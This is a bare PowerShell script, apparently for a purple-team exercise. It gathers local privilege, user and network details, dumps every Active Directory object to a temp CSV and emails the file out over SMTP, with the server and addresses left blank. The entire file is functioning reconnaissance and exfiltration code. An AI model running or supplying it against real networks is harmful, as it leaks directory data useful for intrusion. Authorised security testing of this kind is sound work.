whoami /priv
get-localuser
get-netipaddress
$searcher = New-Object System.DirectoryServices.DirectorySearcher
$searcher.Filter = "(objectClass=*)"
$searcher.PageSize = 30
$results = $searcher.FindAll()

$results |
    ForEach-Object {
        $props = $_.Properties
        $obj = New-Object PSObject

        foreach ($key in $props.Keys) {
           $value = ($props[$key] -join ";")
           $obj | Add-Member -NotePropertyName $key -NotePropertyValue $value
        }

       $obj
   } | Export-Csv  -NoTypeInformation -Path $env:temp\export.csv

$smtpServer = ""
$from =""
$to = ""

$smtp = New-Object Net.Mail.SmtpClient($smtpServer)
$msg = New-Object Net.Mail.MailMessage
$msg.From = $from
$msg.To.Add($to)
$msg.Subject = "Purple Team Export"
$msg.Body = "Purple Team Test Export"
$msg.Attachments.Add("$env:temp\export.csv")


$smtp.Send($msg)
